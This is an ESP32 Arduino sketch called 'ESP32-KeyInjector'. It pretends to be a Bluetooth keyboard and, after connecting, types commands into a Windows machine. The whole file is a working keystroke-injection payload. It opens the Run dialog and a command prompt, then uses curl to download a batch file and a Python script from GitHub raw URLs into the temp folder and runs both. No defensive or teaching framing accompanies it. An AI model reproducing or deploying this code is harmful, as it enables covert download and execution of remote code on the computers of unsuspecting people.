#include <BleKeyboard.h>

BleKeyboard bleKeyboard("ESP32-KeyInjector");

void setup() {
  Serial.begin(115200);
  bleKeyboard.begin();

  while (!bleKeyboard.isConnected()) {
    Serial.println("[INFO] Waiting for Bluetooth connection...");
    delay(500);
  }

  Serial.println("[INFO] Connected! Running payload...");
  delay(2000);

  // Open Run dialog
  bleKeyboard.press(KEY_LEFT_GUI);
  bleKeyboard.press('r');
  bleKeyboard.releaseAll();
  delay(500);

  // Open Command Prompt
  bleKeyboard.println("cmd");
  delay(1000);

  // Download and execute the batch file
  String batchCommand = "curl -L -o %TEMP%\\install_python.bat https://raw.githubusercontent.com/Dhanjithsatheesan/install_python.bat/refs/heads/main/install_python.bat && start /wait %TEMP%\\install_python.bat";
  for (int i = 0; i < batchCommand.length(); i++) {
    bleKeyboard.print(batchCommand[i]);
    delay(50);
  }
  bleKeyboard.press(KEY_RETURN);
  bleKeyboard.releaseAll();
  delay(50000);  // Increased delay to ensure Python + dependencies install

  // Download web.py
  String curlCommand = "curl -L -o %TEMP%\\web.py https://raw.githubusercontent.com/Dhanjithsatheesan/script1.py/refs/heads/main/web.py";
  for (int i = 0; i < curlCommand.length(); i++) {
    bleKeyboard.print(curlCommand[i]);
    delay(50);
  }
  bleKeyboard.press(KEY_RETURN);
  bleKeyboard.releaseAll();
  delay(5000);

  // Run web.py
  String runCommand = "python %TEMP%\\web.py";
  for (int i = 0; i < runCommand.length(); i++) {
    bleKeyboard.print(runCommand[i]);
    delay(50);
  }
  bleKeyboard.press(KEY_RETURN);
  bleKeyboard.releaseAll();

  Serial.println("[INFO] Payload executed.");
}

void loop() {
  // Keep device alive
}
